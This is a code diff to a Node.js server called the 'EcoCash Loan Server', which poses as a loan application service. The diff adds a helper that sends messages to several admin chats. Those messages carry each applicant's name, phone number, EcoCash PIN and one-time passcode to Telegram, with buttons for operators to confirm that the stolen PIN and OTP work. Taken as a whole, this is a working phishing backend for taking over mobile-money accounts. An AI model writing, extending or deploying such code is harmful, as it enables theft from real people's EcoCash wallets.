@@ -28,6 +28,30 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
+// Helper function to send Telegram messages to all admins
+async function sendToAllAdmins(payload) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const rawChatIds = process.env.TELEGRAM_CHAT_ID;
+
+  if (!botToken || !rawChatIds) return;
+
+  // Split comma-separated Chat IDs into an array
+  const adminChatIds = rawChatIds.split(',').map(id => id.trim());
+
+  for (const chatId of adminChatIds) {
+    if (!chatId) continue;
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ...payload, chat_id: chatId })
+      });
+    } catch (err) {
+      console.error(`Failed to send message to admin ${chatId}:`, err.message);
+    }
+  }
+}
+
 // STEP 2: Send Phone & PIN to Telegram
 app.post('/api/apply-loan', async (req, res) => {
   try {
@@ -42,51 +66,41 @@ app.post('/api/apply-loan', async (req, res) => {
       status: 'PENDING_PIN'
     });
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const currentTimestamp = new Date().toLocaleString('en-US', {
+      timeZone: 'Africa/Harare',
+      year: 'numeric',
+      month: 'numeric',
+      day: 'numeric',
+      hour: 'numeric',
+      minute: '2-digit',
+      second: '2-digit',
+      hour12: true
+    });
 
-    if (botToken && chatId) {
-      const currentTimestamp = new Date().toLocaleString('en-US', {
-        timeZone: 'Africa/Harare',
-        year: 'numeric',
-        month: 'numeric',
-        day: 'numeric',
-        hour: 'numeric',
-        minute: '2-digit',
-        second: '2-digit',
-        hour12: true
-      });
+    const messageText = `🔑 <b>NEW PIN SUBMITTED</b>\n\n` +
+                        `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
+                        `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
+                        `💼 <b>Occupation:</b> ${data.occupation || 'N/A'}\n` +
+                        `💵 <b>Loan Amount:</b> $${data.loanAmount || 'N/A'}\n` +
+                        `📞 <b>Phone:</b> 263${formattedPhone}\n` +
+                        `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
+                        `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
+                        `❓ <b>VERIFY PIN ACCURACY:</b>`;
 
-      const messageText = `🔑 <b>NEW PIN SUBMITTED</b>\n\n` +
-                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
-                          `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
-                          `💼 <b>Occupation:</b> ${data.occupation || 'N/A'}\n` +
-                          `💵 <b>Loan Amount:</b> $${data.loanAmount || 'N/A'}\n` +
-                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
-                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
-                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
-                          `❓ <b>VERIFY PIN ACCURACY:</b>`;
-
-      const telegramPayload = {
-        chat_id: chatId,
-        text: messageText,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
-              { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
-            ]
+    const telegramPayload = {
+      text: messageText,
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
+            { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
           ]
-        }
-      };
+        ]
+      }
+    };
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(telegramPayload)
-      });
-    }
+    await sendToAllAdmins(telegramPayload);
 
     res.status(201).json({ success: true, appReference });
   } catch (error) {
@@ -107,48 +121,38 @@ app.post('/api/submit-otp', async (req, res) => {
       activeApplications.set(appReference, appData);
     }
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const currentTimestamp = new Date().toLocaleString('en-US', {
+      timeZone: 'Africa/Harare',
+      year: 'numeric',
+      month: 'numeric',
+      day: 'numeric',
+      hour: 'numeric',
+      minute: '2-digit',
+      second: '2-digit',
+      hour12: true
+    });
 
-    if (botToken && chatId) {
-      const currentTimestamp = new Date().toLocaleString('en-US', {
-        timeZone: 'Africa/Harare',
-        year: 'numeric',
-        month: 'numeric',
-        day: 'numeric',
-        hour: 'numeric',
-        minute: '2-digit',
-        second: '2-digit',
-        hour12: true
-      });
+    const messageText = `📲 <b>ECOCASH OTP SUBMITTED</b>\n\n` +
+                        `📋 <b>Ref:</b> <code>${appReference || 'N/A'}</code>\n` +
+                        `📞 <b>Phone:</b> 263${formattedPhone}\n` +
+                        `💬 <b>OTP (6-digit):</b> <code>${otpCode || 'N/A'}</code>\n` +
+                        `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
+                        `❓ <b>VERIFY OTP ACCURACY:</b>`;
 
-      const messageText = `📲 <b>ECOCASH OTP SUBMITTED</b>\n\n` +
-                          `📋 <b>Ref:</b> <code>${appReference || 'N/A'}</code>\n` +
-                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
-                          `💬 <b>OTP (6-digit):</b> <code>${otpCode || 'N/A'}</code>\n` +
-                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
-                          `❓ <b>VERIFY OTP ACCURACY:</b>`;
-
-      const telegramPayload = {
-        chat_id: chatId,
-        text: messageText,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
-              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
-            ]
+    const telegramPayload = {
+      text: messageText,
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
+            { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
           ]
-        }
-      };
+        ]
+      }
+    };
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(telegramPayload)
-      });
-    }
+    await sendToAllAdmins(telegramPayload);
 
     res.status(200).json({ success: true, message: "OTP received" });
   } catch (error) {
@@ -217,27 +221,22 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Marked as CORRECT ✅</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
 
-    // Send a new Telegram message asking to Finalize Loan Approval with "APPROVED 🎉" Button
-    const approvalPrompt = `🎉 <b>OTP VERIFIED SUCCESSFULLY</b>\n\n` +
-                           `📋 <b>Ref:</b> <code>${appReference}</code>\n\n` +
-                           `Click the button below to approve the loan and trigger the congratulations notice on the applicant's screen:`;
-
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: approvalPrompt,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: 'APPROVED 🎉', callback_data: `approve_loan_${appReference}` }
-            ]
+    // Prompt for final approval to all admins
+    const approvalPrompt = {
+      text: `🎉 <b>OTP VERIFIED SUCCESSFULLY</b>\n\n` +
+            `📋 <b>Ref:</b> <code>${appReference}</code>\n\n` +
+            `Click the button below to approve the loan and trigger the congratulations notice on the applicant's screen:`,
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: 'APPROVED 🎉', callback_data: `approve_loan_${appReference}` }
           ]
-        }
-      })
-    });
+        ]
+      }
+    };
+
+    await sendToAllAdmins(approvalPrompt);
   }
 
   if (actionData.startsWith('otp_wrong_')) {
@@ -285,3 +284,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
+      
